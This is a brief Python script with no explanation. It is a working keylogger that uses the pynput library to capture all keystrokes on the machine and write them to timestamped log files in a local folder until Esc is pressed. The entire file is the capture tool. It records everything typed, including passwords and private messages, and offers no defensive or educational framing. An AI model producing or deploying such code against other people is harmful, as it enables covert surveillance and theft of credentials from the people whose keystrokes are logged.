import os
import pynput
import datetime

from pynput.keyboard import Key, Listener

now = datetime.datetime.now()
log_dir = os.path.join(os.path.dirname(__file__), "logs")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
file_path = os.path.abspath(os.path.join(log_dir, f"output_{now.strftime('%Y%m%d_%H%M%S')}.txt"))

while os.path.exists(file_path):
    now = datetime.datetime.now()
    file_path = os.path.abspath(os.path.join(log_dir, f"output_{now.strftime('%Y%m%d_%H%M%S')}.txt"))

def on_press(key):
    with open(file_path, "a") as f:
        f.write(str(key).replace("'", "") + " ")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener: 
    listener.join()
